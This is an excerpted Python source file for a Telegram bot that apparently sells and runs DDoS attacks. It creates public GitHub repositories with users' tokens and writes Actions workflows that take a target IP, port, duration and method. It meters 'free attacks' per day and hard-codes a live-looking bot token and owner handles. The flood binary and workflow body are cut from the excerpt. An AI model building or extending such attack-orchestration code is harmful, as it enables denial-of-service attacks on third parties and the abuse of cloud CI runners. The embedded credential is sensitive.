...
BOT_TOKEN = "8756172361:AAECEX6Zosl_G7pgGAVnTqLjOaXrX15GraA"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "neo"
BINARY_STORAGE_PATH = "stored_binary.bin"
ADMIN_IDS = [7480150035, 7480150035]
OWNER_USERNAME = "@XD_DEVILXKILLER"
        ...
        default_links = {
            "channels": [
                ...
                },
                {
                    "name": "Public Channel",
                    "username": "@RANDIAPEX",
                    "link": "https://t.me/RANDIAPEX",
                    "type": "public",
                    "enabled": True
                }
            ],
            "free_group": {
                "link": "https://t.me/+j2GXbScWMGA0NWZl",
                "id": -1003137949963,
                "enabled": True
            },
            "referral": {
...
def create_repository(token, repo_name="neocrack-tg"):
    try:
        g = Github(token)
        user = g.get_user()
        ...
        try:
            ...
            repo = user.create_repo(
                repo_name,
                description="neoCRACK DDOS Bot Repository",
                private=False,
                auto_init=False
            )
            return repo, True
...
def update_yml_file(token, repo_name, ip, port, time_val, method):
    yml_content = f"""name: neocrack fucker
on: [push]
...
async def handle_button_press(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    if "𝐅𝐋𝐀𝐌𝐄 𝐒𝐄𝐑𝐕𝐄𝐑" in text or clean_text == "NEO SERVER":
        await select_server(update, user_id, "NEO")
    elif "NEO2 𝐒𝐄𝐑𝐕𝐄𝐑" in text or clean_text == "NEO SERVER":
        await select_server(update, user_id, "NEO")
...
async def handle_free_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    try:
        ...
        await update.message.reply_text(f"❌ {bold('𝐈??𝐕𝐀𝐋𝐈𝐃 𝐍𝐔𝐌𝐁𝐄𝐑𝐒')}")
        return
...
async def set_public_link_start(update: Update, user_id):
    ...
    await update.message.reply_text(
        ...
        f"{bold('𝐄𝐱𝐚𝐦𝐩𝐥𝐞')}: `https://t.me/NEO1769_updates`\n\n"
        f"👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}",
        reply_markup=reply_markup
    )
...
async def list_tokens(update: Update, user_id):
    """List all tokens"""
    if not is_owner(user_id):
        await update.message.reply_text(f"⚠️ {bold('𝐀𝐂??𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃')}\n\n👑 {bold('𝐎𝐰𝐧𝐞𝐫')}: {OWNER_USERNAME}")
        return
...
def main():
    ...
    print(f"  📊 {bold('??𝐚𝐱/𝐃𝐚𝐲')}: {free_settings['max_attacks_per_day']}")
